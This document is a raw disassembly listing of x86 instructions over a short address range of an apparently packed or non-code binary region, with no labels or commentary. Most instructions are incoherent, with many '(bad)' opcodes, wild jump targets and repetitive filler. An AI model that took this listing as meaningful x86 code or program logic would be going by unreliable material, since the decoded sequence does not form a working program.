  4081fa:	add    eax,0x4dbc7cd
  4081ff:	push   cs
  408200:	add    esi,edx
  408202:	add    al,0xdd
  408204:	(bad)  
  408205:	retf   
  408206:	add    al,0x0
  408208:	mov    dl,0xf7
  40820a:	and    DWORD PTR [eax],eax
  40820c:	in     eax,dx
  40820d:	test   eax,0xf88a0004
  408212:	in     al,0xff
  408214:	sar    BYTE PTR [ecx],0x4
  408217:	add    BYTE PTR [esi],dh
  408219:	clc    
  40821a:	stos   DWORD PTR es:[edi],eax
  40821b:	call   FWORD PTR [eax+0x29]
  40821e:	add    al,0x0
  408220:	cmp    al,0x9
  408223:	add    BYTE PTR [ebp+0x39],al
  408226:	add    al,0x0
  408228:	adc    bh,al
  40822a:	push   cs
  40822b:	add    BYTE PTR [ecx],dl
	...
  408245:	add    BYTE PTR [ecx],ch
  408247:	add    al,0x0
  408249:	xor    al,0xf8
  40824b:	std    
  40824c:	(bad)  
  40824d:	cld    
  40824e:	cmp    BYTE PTR [eax+eax*1],al
  408251:	jb     0x40824b
  408253:	icebp  
  408254:	(bad)  
  408255:	jl     0x408281
  408257:	add    al,0x0
  408259:	dec    ebx
  40825a:	clc    
  40825b:	or     eax,DWORD PTR [eax]
  40825d:	test   DWORD PTR [edx],edi
  40825f:	add    al,0x0
  408261:	jle    0x40825b
  408263:	adc    BYTE PTR [eax],al
  408265:	xchg   ebp,eax
  408266:	sub    al,BYTE PTR [eax+eax*1]
  408269:	jnp    0x408263
  40826b:	(bad)  
  40826d:	xor    DWORD PTR [edx-0x787fffd],edi
  408273:	str    WORD PTR [ebp-0x1cfffc56]
  40827a:	test   DWORD PTR [esi],0x3ba7900
  408280:	add    BYTE PTR [edx-0x8],al
  408283:	sldt   WORD PTR [ebp+0x1e0003aa]
  40828a:	clc    
  40828b:	adc    BYTE PTR [eax],al
  40828d:	jne    0x408249
  40828f:	add    eax,DWORD PTR [eax]
  408291:	ja     0x40828b
  408293:	lock inc DWORD PTR [ecx+ebp*4-0x11fffffd]
  40829b:	or     BYTE PTR [ebx],cl
  40829d:	add    BYTE PTR [ebp+0x51],dl
  4082a0:	aas    
  4082a1:	add    BYTE PTR [edx],dl
  4082a3:	or     DWORD PTR [eax],edx
  4082a5:	add    BYTE PTR [ecx+0x51],dl
  4082a8:	aas    
	...
  4082c1:	add    BYTE PTR [eax],al
  4082c3:	pop    edi
  4082c4:	pop    es
  4082c5:	or     eax,DWORD PTR [eax]
  4082c7:	adc    eax,0xaa003f53
  4082cc:	pop    es
  4082cd:	or     eax,DWORD PTR [eax]
  4082cf:	pop    ecx
  4082d0:	push   ecx
  4082d1:	aas    
  4082d2:	add    bl,cl
  4082d4:	pop    es
  4082d5:	pop    es
  4082d6:	add    cl,dh
  4082d8:	push   edx
  4082d9:	aas    
  4082da:	add    cl,dh
  4082dc:	or     BYTE PTR [edx],dl
  4082de:	add    BYTE PTR ds:0x10003f51,bl
  4082e4:	or     DWORD PTR [esi],esp
  4082e6:	add    BYTE PTR [ebp-0x21ffc0b2],al
  4082ec:	or     BYTE PTR [eax+eax*1],cl
  4082ef:	gs dec esi
  4082f1:	aas    
  4082f2:	add    BYTE PTR [edi+0x5d001507],ch
  4082f8:	dec    esi
  4082f9:	aas    
  4082fa:	add    BYTE PTR [edi-0x42fff2f9],ch
  408300:	dec    esi
  408301:	aas    
  408302:	add    BYTE PTR [edi+0x6],ah
  408305:	adc    DWORD PTR [eax],eax
  408307:	imul   ecx,DWORD PTR [edi+0x3f],0xb08fa00
  40830e:	add    BYTE PTR [ebp+0x4f],bl
  408311:	aas    
  408312:	add    BYTE PTR [ebx],dl
  408314:	push   es
  408315:	pop    ds
  408316:	add    BYTE PTR [ebp+0x6b003f4f],cl
  40831c:	push   es
  40831d:	or     DWORD PTR [eax],eax
  40831f:	mov    cl,0x4f
  408321:	aas    
  408322:	add    BYTE PTR [esi+0x306],bl
	...
  408340:	jge    0x408391
  408342:	aas    
  408343:	add    ah,dh
  408345:	sub    eax,DWORD PTR [ebx]
  408347:	add    ah,dh
  408349:	sub    eax,DWORD PTR [ebx]
  40834b:	add    ah,dh
  40834d:	sti    
  40834e:	mov    ebp,DWORD PTR ss:[ecx+esi*1+0x54]
  408353:	fcmovb st,st(7)
  408355:	mov    bl,0x8f
  408357:	xor    eax,esi
  408359:	mov    ebx,0xc4c898f9
  40835e:	fld    QWORD PTR [ecx]
  408360:	xchg   edx,eax
  408361:	xor    BYTE PTR [edx+0x57],al
  408364:	fs jae 0x4083b7
  408367:	pop    es
  408368:	in     al,dx
  408369:	cmc    
  40836a:	and    ch,BYTE PTR [ebx]
  40836c:	xor    DWORD PTR [ecx-0x65401c16],edi
  408372:	les    ecx,FWORD PTR [ebp-0x5f]
  408375:	dec    ecx
  408376:	push   edi
  408377:	and    al,0x61
  408379:	mov    al,ds:0x4d7b6e2a
  40837e:	fidiv  WORD PTR [eax+ebx*1-0x7a]
  408382:	adc    DWORD PTR [ebx],ebx
  408384:	ret    0x58b1
  408387:	mov    ds:0x3d87bed1,eax
  40838c:	mov    edi,0xc91420fa
  408391:	mov    fs,WORD PTR ds:0xbedf9b8f
  408397:	repnz in al,0xdb
  40839a:	test   al,0x8e
  40839c:	mov    BYTE PTR [esi-0x58c62327],0xc9
  4083a3:	jmp    0x4083a5
	...
  4083bd:	(bad)  
  4083be:	cmp    al,0x13
  4083c0:	push   es
  4083c1:	mov    al,ds:0xeee2e526
  4083c6:	ins    DWORD PTR es:[edi],dx
  4083c7:	pop    es
  4083c8:	push   0xffffffbf
  4083ca:	xor    ecx,DWORD PTR [ecx]
  4083cc:	mov    eax,ds:0xb087b072
  4083d1:	in     al,0xf
  4083d3:	cmp    dl,BYTE PTR [ecx-0x29]
  4083d6:	add    al,0x34
  4083d8:	adc    ebp,edi
  4083da:	leave  
  4083db:	call   0x618227c3
  4083e0:	add    eax,0x13e504f4
  4083e5:	add    ch,dh
  4083e7:	fcom   QWORD PTR [ebx]
  4083e9:	call   0xd05448e2
  4083ee:	xor    eax,0x1cdcd951
  4083f3:	push   0xf6dbcbb2
  4083f8:	int3   
  4083f9:	dec    ebp
  4083fa:	xlat   BYTE PTR ds:[ebx]
  4083fb:	fs int3 
  4083fd:	push   0x29064238
  408402:	and    eax,0x57e7799c
  408407:	mov    dh,0x13
  408409:	push   0x901384f4
  40840e:	hlt    
  40840f:	jl     0x408424
  408411:	js     0x408407
  408413:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408414:	adc    eax,DWORD PTR [eax-0xc]
  408417:	mov    esp,0xc5f44813
  40841c:	fisubr WORD PTR [edx+0x3f]
  40841f:	dec    edi
  408420:	jl     0x408422
	...
  40843a:	je     0x408424
  40843c:	push   0x96f01876
  408441:	sbb    DWORD PTR [eax+ecx*2],edx
  408444:	jbe    0x40847d
  408446:	ret    
  408447:	mov    dh,0xa
  408449:	mov    ecx,0xd36d4dac
  40844e:	aas    
  40844f:	idiv   BYTE PTR [esp+edx*1+0x14c4f648]
  408456:	push   eax
  408457:	neg    ah
  408459:	adc    al,0x58
  40845b:	mul    BYTE PTR [esp+edx*1-0x80]
  40845f:	neg    BYTE PTR [edx+edx*2-0x1b]
  408463:	dec    ecx
  408464:	cmp    al,0x2f
  408466:	mov    ss,WORD PTR [ebx+0x0]
  408469:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40846a:	push   ecx
  40846b:	je     0x408442
  40846d:	add    eax,0x32bb338d
  408472:	cmp    al,0x7a
  408474:	dec    esi
  408475:	cmp    al,0x7a
  408477:	ror    BYTE PTR [eax+0x3151b987],1
  40847d:	in     eax,0xe5
  40847f:	adc    BYTE PTR [edx],dh
  408481:	fucom  st(5)
  408483:	and    BYTE PTR [edx],dh
  408485:	(bad)
  408488:	xor    DWORD PTR [ebp-0x5acdff1b],edi
  40848e:	add    eax,0xdb789492
  408493:	adc    eax,0x76e88268
  408498:	aas    
  408499:	imul   BYTE PTR [ecx]
  40849b:	imul   edx,DWORD PTR [esi+0xe6],0x0
	...
  4084b5:	add    BYTE PTR [eax],al
  4084b7:	xchg   esi,ebp
  4084b9:	mov    ebx,0x56430fe6
  4084be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084bf:	add    dl,BYTE PTR [edi-0x7f198298]
  4084c5:	xor    ah,BYTE PTR [ebp-0x42cdaefa]
  4084cb:	push   es
  4084cc:	popa   
  4084cd:	xor    al,BYTE PTR [ebp-0x62cdcefa]
  4084d3:	push   es
  4084d4:	inc    ecx
  4084d5:	cmc    
  4084d6:	pop    edx
  4084d7:	cdq    
  4084d8:	cwde   
  4084d9:	gs mov ah,0x2e
  4084dc:	jmp    edi
  4084de:	xchg   DWORD PTR [edi+ebx*8-0x1c0eff2a],esp
  4084e5:	xlat   BYTE PTR ds:[ebx]
  4084e6:	cld    
  4084e7:	jns    0x408550
  4084e9:	jle    0x4084fe
  4084eb:	push   ebp
  4084ec:	add    al,0x1c
  4084ee:	jmp    0xdd7335f7
  4084f3:	add    al,0xc1
  4084f5:	xor    ah,BYTE PTR [ebp-0x1b]
  4084f8:	nop
  4084f9:	xor    eax,DWORD PTR [eax]
  4084fb:	sub    DWORD PTR [esi],edx
  4084fd:	pushf  
  4084fe:	xor    edi,DWORD PTR [ecx+0x15]
  408501:	lods   al,BYTE PTR ds:[esi]
  408502:	xor    edi,DWORD PTR [eax-0x66]
  408505:	mov    dh,0xb
  408507:	stos   DWORD PTR es:[edi],eax
  408508:	or     ecx,DWORD PTR [edi-0x20]
  40850b:	mov    eax,ds:0xcd4e11fb
  408510:	pop    esi
  408511:	mov    al,ds:0x97cd7c10
  408516:	out    0x47,al
  408518:	xchg   BYTE PTR [edx+0x5],ch
	...
  408532:	add    BYTE PTR [eax],al
  408534:	mov    BYTE PTR [eax+0x1b],al
  408537:	xor    al,0xb9
  408539:	cvttps2pi mm6,QWORD PTR [ecx+edi*1]
  40853d:	(bad)  
  40853f:	xor    al,0x99
  408541:	cmovl  esi,DWORD PTR [ecx+ebp*1]
  408545:	adc    eax,0xf1b9345c
  40854a:	pop    ss
  40854b:	adc    DWORD PTR [ebp+0x4a],edi
  40854e:	mov    BYTE PTR [edi+0x3254d44f],al
  408554:	js     0x4085d1
  408556:	je     0x4085c1
  408558:	push   edi
  408559:	mov    bl,0x24
  40855b:	mov    al,0xe4
  40855d:	(bad)  
  40855e:	mov    fs,WORD PTR [ecx+0x349ebd1e]
  408564:	imul   ecx,DWORD PTR [edi],0xf7934dc
  40856a:	in     al,dx
  40856b:	xor    al,0x79
  40856d:	paddb  mm6,QWORD PTR [ecx+ebx*1]
  408571:	push   cs
  408572:	or     al,0x35
  408574:	sub    DWORD PTR [esi],ecx
  408576:	push   edi
  408577:	(bad)  
  408578:	mov    eax,0x9d225fcf
  40857d:	mov    ss,WORD PTR [ebx-0xa]
  408580:	xchg   ecx,eax
  408581:	jmp    0x331d:0x88de0c94
  408588:	mov    gs,WORD PTR [ecx+0x26]
  40858b:	adc    dh,ah
  40858d:	and    eax,0xa857b1cd
  408592:	or     eax,0xde0018c
  408597:	pushf  
	...
  4085b0:	add    BYTE PTR [ecx],cl
  4085b2:	mov    BYTE PTR [esi],cl
  4085b4:	lods   al,BYTE PTR ds:[esi]
  4085b5:	add    eax,eax
  4085b7:	or     eax,0xde7e9bc
  4085bc:	int3   
  4085bd:	xlat   BYTE PTR ss:[ebx]
  4085bf:	dec    edi
  4085c0:	mov    ebx,0x15dab7c8
  4085c5:	or     BYTE PTR [ebx+ecx*8+0x32bca386],al
  4085cc:	mov    edi,0xdd6be4ee
  4085d1:	(bad)  
  4085d2:	dec    esp
  4085d3:	adc    ah,ah
  4085d5:	or     al,0xe3
  4085d7:	shrd   DWORD PTR [edi],esp,0xfc
  4085db:	lfs    esp,FWORD PTR [edi]
  4085de:	idiv   DWORD PTR fs:[ebx-0x3c0893d9]
  4085e5:	daa    
  4085e6:	fs test ebx,0x48444f07
  4085ed:	jge    0x4085e4
  4085ef:	les    eax,FWORD PTR [eax+0x6811ccad]
  4085f5:	push   esp
  4085f6:	stos   BYTE PTR es:[edi],al
  4085f7:	jmp    0x2aafb702
  4085fc:	(bad)  
  4085fd:	fs gs ret 
  408600:	pop    ecx
  408601:	data16 scas al,BYTE PTR es:[edi]
  408603:	xlat   BYTE PTR ds:[ebx]
  408604:	stos   DWORD PTR es:[edi],eax
  408605:	loop   0x4085e2
  408607:	stc    
  408608:	mov    bl,0xca
  40860a:	sar    ecx,cl
  40860c:	mov    ebx,0xc3fa6bc2
  408611:	retf   0xfb17
  408614:	push   edi
	...
  40862d:	add    bl,al
  40862f:	xlat   BYTE PTR ds:[ebx]
  408630:	cmp    ebx,DWORD PTR [esi]
  408632:	adc    al,0x84
  408634:	push   ss
  408635:	test   al,0xd3
  408637:	add    al,0x67
  408639:	inc    esi
  40863a:	dec    edx
  40863b:	das    
  40863c:	mov    ebx,0xbc149474
  408641:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408642:	and    al,0xd
  408644:	dec    eax
  408645:	mov    ebx,0xdb62066f
  40864a:	repnz sti 
  40864c:	call   0x51457ad4
  408651:	add    al,0xf4
  408653:	add    al,0x81
  408655:	(bad)  
  408656:	pop    edi
  408657:	cli    
  408658:	pop    eax
  408659:	(bad)  
  40865a:	addr16 cli 
  40865c:	pusha  
  40865d:	(bad)  
  40865e:	sbb    ebp,edi
  408660:	test   DWORD PTR [ebx+eiz*4],ebx
  408663:	mov    edx,0xaa590fdc
  408668:	or     DWORD PTR [ebx],0xda6a331
  40866e:	dec    edi
  40866f:	cmp    al,0xe0
  408671:	das    
  408672:	mov    bl,0x81
  408674:	sbb    eax,0xd9179c93
  408679:	std    
  40867a:	addr16 cli 
  40867c:	loopne 0x40867b
  40867e:	pop    edi
  40867f:	cli    
  408680:	in     al,0xfe
  408682:	add    edi,edx
  408684:	hlt    
  408685:	(bad)  
  408686:	jecxz  0x408681
  408688:	in     al,0xfe
  40868a:	jecxz  0x40869f
  40868c:	adc    al,0xeb
  40868e:	xchg   ebx,eax
  40868f:	jae    0x40862e
  408691:	sldt   WORD PTR [eax]
	...
  4086a8:	add    BYTE PTR [eax],al
  4086aa:	add    BYTE PTR [ebp-0x32a42ba2],bl
  4086b0:	test   BYTE PTR [eax+0x5f],ah
  4086b3:	test   DWORD PTR [eax-0x69],ecx
  4086b6:	push   ebx
  4086b7:	add    eax,0xf4d4cc0b
  4086bc:	push   es
  4086bd:	stos   BYTE PTR es:[edi],al
  4086be:	(bad)  
  4086bf:	pop    ebx
  4086c0:	stc    
  4086c1:	nop
  4086c2:	(bad)  
  4086c3:	mov    ds:0x8c000500,eax
  4086c8:	add    BYTE PTR [eax],al
  4086ca:	add    eax,0x613c84f4
  4086cf:	jmp    0x408661
  4086d1:	cmp    al,0xc2
  4086d3:	and    al,0x8b
  4086d5:	mov    WORD PTR [edx+0x7d486d99],?
  4086db:	lea    esi,[edi+edx*8-0x56]
  4086df:	fild   WORD PTR [esi+0x29ab5d3b]
  4086e5:	test   ecx,ebp
  4086e7:	shl    DWORD PTR [ebp+0x4463b33c],cl
  4086ed:	cmp    al,0x1d
  4086ef:	stos   DWORD PTR es:[edi],eax
  4086f0:	dec    esp
  4086f1:	cmp    al,0x15
  4086f3:	mov    ds:0xf4993cb0,eax
  4086f8:	test   al,0x3d
  4086fa:	cdq    
  4086fb:	cmc    
  4086fc:	add    al,0x0
  4086fe:	jmp    0xa06864a4
  408703:	jno    0x4086c6
  408705:	mov    edi,0x9aa3d35
  40870a:	push   es
  40870b:	push   ebx
  40870c:	dec    edi
  40870d:	rcr    DWORD PTR [edx+0x0],cl
	...
  408728:	mov    ch,0x56
  40872a:	pop    es
  40872b:	mov    edi,DWORD PTR [eax]
  40872d:	push   0x3ce6555f
  408732:	ss mov cl,0x4e
  408735:	or     BYTE PTR [edi],dh
  408737:	gs dec eax
  408739:	mov    edi,0x26f4843b
  40873e:	cmp    al,0xb6
  408740:	hlt    
  408741:	sbb    al,0x3d
  408743:	or     esi,DWORD PTR [ebx]
  408745:	cmp    al,BYTE PTR [esi]
  408747:	lock shr DWORD PTR [esi-0x63],1
  40874b:	adc    BYTE PTR [esi+edx*1-0x1e],0xac
  408750:	push   ds
  408751:	ud0    ebx,DWORD PTR [edi+0x4a3bdb06]
  408758:	cld    
  408759:	imul   eax,esi,0x0
  40875c:	xor    dh,cl
  40875e:	and    esi,DWORD PTR ds:0x9d
  408764:	loope  0x40879d
  408766:	adc    dh,BYTE PTR [eax]
  408768:	mov    bh,0x37
  40876a:	das    
  40876b:	xor    BYTE PTR [ebx+0x4e306537],dl
  408771:	xor    DWORD PTR [esi+0x1606e5f6],esp
  408777:	arpl   WORD PTR [edi+0x4227121],ax
  40877d:	or     al,BYTE PTR [ebx]
  40877f:	rcl    al,0x28
  408782:	dec    edi
  408783:	cdq    
  408784:	adc    bl,dl
  408786:	dec    esp
  408787:	neg    DWORD PTR [edi]
  408789:	iret   
  40878a:	inc    edx
  40878b:	test   al,0x0
	...
  4087a5:	pop    edx
  4087a6:	xor    ah,BYTE PTR [ebp+0x35]
  4087a9:	cmp    dh,BYTE PTR [esi+eax*8]
  4087ac:	xor    eax,0x35e333ce
  4087b1:	jne    0x4087f0
  4087b3:	jno    0x4087eb
  4087b5:	jne    0x4087f4
  4087b7:	xor    BYTE PTR [esi],0xd8
  4087ba:	mov    edx,0x4ead0c75
  4087bf:	xchg   ecx,eax
  4087c0:	dec    esi
  4087c1:	out    0x96,al
  4087c3:	sbb    dl,ah
  4087c5:	push   cs
  4087c6:	cmp    al,0x60
  4087c8:	dec    edi
  4087c9:	dec    ebp
  4087ca:	addr16 push ebp
  4087cc:	xchg   DWORD PTR [ebp-0x6],esi
  4087cf:	push   edi
  4087d0:	jne    0x408767
  4087d2:	in     eax,0x44
  4087d4:	aaa    
  4087d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4087d6:	cmp    eax,0x3cce3779
  4087db:	lea    esi,[edi]
  4087dd:	push   0x3c
  4087df:	push   ebx
  4087e0:	cmp    cl,ah
  4087e2:	cmp    BYTE PTR [ebp+0x75f95838],dl
  4087e8:	test   al,0x21
  4087ea:	fild   DWORD PTR [esi-0x3a810b0e]
  4087f0:	js     0x4087cd
  4087f2:	pop    ecx
  4087f3:	dec    esi
  4087f4:	(bad)  
  4087f5:	imul   DWORD PTR [esi+0x7b]
  4087f8:	and    cl,BYTE PTR [eax+0x59]
  4087fb:	pop    ss
  4087fc:	rcr    DWORD PTR [ebx],1
  4087fe:	int    0xaf
  408800:	out    dx,eax
  408801:	sub    cl,BYTE PTR [ebp+0x0]
  408804:	(bad)  
  408805:	and    ebp,DWORD PTR [ebx+esi*2]
	...
  408820:	add    BYTE PTR [eax],al
  408822:	hlt    
  408823:	mov    bl,0x2
  408825:	add    ah,dh
  408827:	sub    bl,dh
  408829:	push   cs
  40882a:	add    al,0x44
  40882c:	ret    
  40882d:	pop    edi
  40882e:	gs je  0x4087c1
  408831:	jp     0x40889f
  408833:	adc    esp,ebx
  408835:	fldenv [edi+ebp*1-0x2e46c999]
  40883c:	sahf   
  40883d:	sti    
  40883e:	gs bnd js 0x408809
  408842:	mov    esp,0xc525fcd9
  408847:	dec    eax
  408848:	cmc    
  408849:	lods   al,BYTE PTR ds:[esi]
  40884a:	sbb    esi,DWORD PTR [ecx-0x36]
  40884d:	(bad)  
  40884e:	fcomp  DWORD PTR [ecx+0x10]
  408851:	imul   esp,ebx,0x1ba9fb24
  408857:	sbb    BYTE PTR [esi+0x5a32cd18],0x16
  40885e:	cvtps2pi mm7,QWORD PTR [ecx+0x2d]
  408862:	jmp    0xa260:0xc59a0ae
  408869:	fimul  WORD PTR ds:0x8453aebd
  40886f:	in     eax,dx
  408870:	mov    eax,0xcdf5c9
  408875:	mov    al,0xa7
  408877:	fsqrt  
  408879:	sbb    eax,0xb5ad8eb5
  40887e:	add    DWORD PTR ds:0xd4b88f7a,0x2ced
	...
  40889c:	add    BYTE PTR [eax],al
  40889e:	add    BYTE PTR [ecx+0x1d],bl
  4088a1:	jns    0x4088ee
  4088a3:	shr    ebp,1
  4088a5:	inc    edx
  4088a6:	(bad)
  4088aa:	call   0xf9602c57
  4088af:	lods   eax,DWORD PTR ds:[esi]
  4088b0:	cli    
  4088b1:	sti    
  4088b2:	(bad)  
  4088b3:	cmp    al,0xfa
  4088b5:	scas   al,BYTE PTR es:[edi]
  4088b6:	(bad)  
  4088b7:	cmp    edx,edi
  4088b9:	xchg   ebp,eax
  4088ba:	call   edi
  4088bc:	stc    
  4088bd:	into   
  4088be:	and    DWORD PTR [ecx+esi*4+0xc],eax
  4088c2:	push   esp
  4088c3:	mov    esp,0x4cf1a45b
  4088c8:	push   ds
  4088c9:	xchg   edi,eax
  4088ca:	cmp    eax,0x34684efa
  4088cf:	jmp    0xbdef:0x474ea854
  4088d6:	push   cs
  4088d7:	std    
  4088d8:	mov    dh,0xf5
  4088da:	jmp    0x53c1:0xda474abc
  4088e1:	jmp    0xc172:0xa735043b
  4088e8:	out    dx,eax
  4088e9:	add    esi,DWORD PTR [ebp+0x4]
  4088ec:	ret    0x3eb8
  4088ef:	in     al,0xe0
  4088f1:	cmc    
  4088f2:	dec    edx
  4088f3:	fcmovne st,st(3)
  4088f5:	iret   
  4088f6:	in     eax,0x52
  4088f8:	adc    esp,edx
  4088fa:	xchg   edx,eax
  4088fb:	jmp    0x408919
  4088fd:	shr    cl,1
  4088ff:	cld    
  408900:	test   eax,0x9648
	...
  408919:	add    BYTE PTR [eax],al
  40891b:	add    dl,al
  40891d:	sti    
  40891e:	pop    esi
  40891f:	adc    BYTE PTR [ebp+0x476a1bb1],al
  408925:	or     BYTE PTR [ebx+0x19],al
  408928:	pop    ds
  408929:	mov    ch,0xff
  40892b:	sbb    eax,0xf22cd28b
  408930:	adc    ah,dl
  408932:	mov    cs,WORD PTR [edi]
  408934:	xor    al,BYTE PTR [ecx+0x6e4792e3]
  40893a:	add    cl,cl
  40893c:	push   eax
  40893d:	sub    eax,0xaa3db066
  408942:	jmp    DWORD PTR [edi+0x62d5e4c2]
  408948:	pop    esp
  408949:	popf   
  40894a:	jmp    0x4089aa
  40894c:	call   0xe431:0x5f482252
  408953:	jl     0x4088fb
  408955:	mov    esi,0xa4c1c4d5
  40895a:	sub    al,0xbd
  40895c:	outs   dx,DWORD PTR ds:[esi]
  40895d:	(bad)  
  40895e:	shl    BYTE PTR [eax],1
  408960:	adc    BYTE PTR gs:[eax+eiz*1],bh
  408964:	and    al,0x53
  408966:	daa    
  408967:	das    
  408968:	test   BYTE PTR [edi],0x51
  40896b:	pushf  
  40896c:	ret    0xaf23
  40896f:	or     dl,BYTE PTR [eax-0x23bf9586]
  408975:	add    BYTE PTR [ebx+0x7e],bl
  408978:	push   esp
  408979:	jl     0x40890f
  40897b:	cmp    esi,DWORD PTR [ecx+0xcca8a5]
	...
  408999:	cmp    bh,BYTE PTR [ecx]
  40899b:	xchg   edi,eax
  40899c:	pop    ebx
  40899d:	scas   eax,DWORD PTR es:[edi]
  40899e:	cld    
  40899f:	sbb    al,0x17
  4089a1:	mov    ch,0x8c
  4089a3:	popf   
  4089a4:	xor    DWORD PTR [ebx],edi
  4089a6:	inc    esi
  4089a7:	retf   
  4089a8:	cmp    al,0x72
  4089aa:	ds loopne 0x408950
  4089ad:	outs   dx,DWORD PTR ds:[esi]
  4089ae:	cmp    eax,0xd0c73d76
  4089b3:	inc    edi
  4089b4:	sbb    eax,0x51383d14
  4089b9:	cmp    BYTE PTR [ebx-0x1b],al
  4089bc:	add    BYTE PTR [ecx+0x2829ccad],ah
  4089c2:	ret    0x5584
  4089c5:	add    eax,0x799f1f70
  4089ca:	sbb    eax,0x2350e800
  4089cf:	ins    DWORD PTR es:[edi],dx
  4089d0:	xchg   edi,eax
  4089d1:	lods   al,BYTE PTR ds:[esi]
  4089d2:	and    esi,DWORD PTR fs:[ecx+0x5e6ade54]
  4089d9:	xchg   BYTE PTR [edi-0x77],bh
  4089dc:	call   0x8f90115e
  4089e1:	inc    ecx
  4089e2:	cli    
  4089e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089e4:	sbb    eax,0x6cf988ce
  4089e9:	(bad)  
  4089ea:	inc    ecx
  4089eb:	add    al,0xe1
  4089ed:	mov    ch,0xfd
  4089ef:	cwde   
  4089f0:	sub    dl,BYTE PTR [ecx]
  4089f2:	stc    
  4089f3:	xchg   esp,eax
  4089f4:	mov    edi,0xe0d50c2a
  4089f9:	adc    eax,0xda60e3
	...
  408a16:	or     bh,dh
  408a18:	stos   DWORD PTR es:[edi],eax
  408a19:	jmp    0x408a1f
  408a1b:	jg     0x408a74
  408a1d:	mov    ebx,0xa14c86b1
  408a22:	ficomp WORD PTR [esi-0x27]
  408a25:	retf   0xd09a
  408a28:	fwait
  408a29:	mov    ebp,0xa376bcd4
  408a2e:	icebp  
  408a2f:	push   edi
  408a30:	inc    edx
  408a31:	mov    dl,0x6e
  408a33:	mov    eax,ds:0x6bdadee2
  408a38:	adc    al,0xf3
  408a3a:	retf   0xfb6d
  408a3d:	push   ss
  408a3e:	stc    
  408a3f:	test   DWORD PTR [eax],edx
  408a41:	jge    0x408a6f
  408a43:	adc    ebp,DWORD PTR [esi]
  408a45:	xor    ecx,DWORD PTR [edx]
  408a47:	sbb    edi,DWORD PTR [esi]
  408a49:	std    
  408a4a:	outs   dx,DWORD PTR ds:[esi]
  408a4b:	retf   0x1355
  408a4e:	hlt    
  408a4f:	push   cs
  408a50:	add    al,0x1
  408a52:	mov    edi,0x6f486d0d
  408a57:	pop    eax
  408a58:	xchg   esp,eax
  408a59:	and    eax,DWORD PTR [eax-0x3d]
  408a5c:	push   esp
  408a5d:	push   ebp
  408a5e:	push   0x5a
  408a60:	mov    ch,0xab
  408a62:	add    eax,0x557849f
  408a67:	sub    eax,0x2df40001
  408a6c:	add    eax,DWORD PTR [eax]
  408a6e:	hlt    
  408a6f:	sub    eax,DWORD PTR [ecx]
  408a71:	add    ah,dh
  408a73:	sub    eax,DWORD PTR [ebx]
  408a75:	add    ah,dh
  408a77:	sub    al,0x2
	...
  408a91:	add    BYTE PTR [eax],al
  408a93:	hlt    
  408a94:	pop    ds
  408a95:	add    eax,DWORD PTR [eax]
  408a97:	hlt    
  408a98:	sub    DWORD PTR [edx],eax
  408a9a:	add    ah,dh
  408a9c:	sbb    eax,0x2bf40003
  408aa1:	add    eax,DWORD PTR [eax]
  408aa3:	hlt    
  408aa4:	sub    eax,DWORD PTR [ebx]
  408aa6:	add    ah,dh
  408aa8:	sub    eax,DWORD PTR [ebx]
  408aaa:	add    ah,dh
  408aac:	sub    eax,DWORD PTR [ebx]
  408aae:	add    ah,dh
  408ab0:	sub    eax,DWORD PTR [ebx]
  408ab2:	add    ah,dh
  408ab4:	sub    eax,DWORD PTR [ebx]
  408ab6:	add    ah,dh
  408ab8:	sub    eax,DWORD PTR [ebx]
  408aba:	add    ah,dh
  408abc:	sub    eax,DWORD PTR [ebx]
  408abe:	add    ah,dh
  408ac0:	sub    esp,edx
  408ac2:	call   esi
  408ac4:	aas    
  408ac5:	out    0x25,al
  408ac7:	shr    DWORD PTR [ebx],cl
  408ac9:	add    ebp,DWORD PTR [edx]
  408acb:	iret   
  408acc:	sub    ebp,esi
  408ace:	sub    eax,0x31f27bf4
  408ad3:	daa    
  408ad4:	jo     0x408acc
  408ad6:	xor    eax,0xfffa7423
  408adb:	arpl   WORD PTR [ebx+eax*1],bp
  408ade:	add    ah,dh
  408ae0:	add    al,0xe9
  408ae2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ae3:	aad    0xa1
  408ae5:	inc    esp
  408ae6:	mov    eax,ds:0xad409dd1
  408aeb:	int    0xa9
  408aed:	cmp    al,0xa9
  408aef:	leave  
  408af0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408af1:	cmp    BYTE PTR [ebp-0x4ecb4e5b],dh
	...
  408b0f:	add    BYTE PTR [ecx-0x6242cf53],ah
  408b15:	add    al,0xe9
  408b17:	add    edi,DWORD PTR [edx-0x6a5af72b]
  408b1d:	mov    eax,ds:0x9d91a104
  408b22:	add    BYTE PTR [ebp-0x57035673],ch
  408b28:	mov    DWORD PTR [ebp-0x4d9a4b08],esp
  408b2e:	hlt    
  408b2f:	mov    al,0x61
  408b31:	scas   al,BYTE PTR es:[edi]
  408b32:	lock mov esp,0x3ed055d
  408b38:	pop    edx
  408b39:	add    eax,0x4f403e9
  408b3e:	jmp    0xe9457f46
  408b43:	add    esi,esp
  408b45:	add    al,0xe9
  408b47:	add    esi,esp
  408b49:	add    al,0xe9
  408b4b:	add    esi,esp
  408b4d:	add    al,0xe9
  408b4f:	add    esi,esp
  408b51:	add    al,0xe9
  408b53:	add    esi,esp
  408b55:	add    al,0xe9
  408b57:	add    esi,esp
  408b59:	add    al,0xe9
  408b5b:	add    esi,esp
  408b5d:	add    al,0xe9
  408b5f:	add    esi,esp
  408b61:	add    al,0xe9
  408b63:	add    esi,esp
  408b65:	add    al,0xe9
  408b67:	add    esi,esp
  408b69:	add    al,0xe9
  408b6b:	add    esi,esp
  408b6d:	add    al,0xe9
  408b6f:	add    esi,esp
  408b71:	add    al,0x0
  408b73:	jmp    0x408b78
	...
  408b8c:	add    bh,dh
  408b8e:	add    al,0x0
  408b90:	jmp    0xe940908c
  408b95:	test   DWORD PTR [eax+eax*1],0x4f7e9
  408b9c:	jmp    0xe9409098
  408ba1:	test   DWORD PTR [eax+eax*1],0x4f7e9
  408ba8:	jmp    0xe94090a4
  408bad:	test   DWORD PTR [eax+eax*1],0x4f7e9
  408bb4:	jmp    0xe94090b0
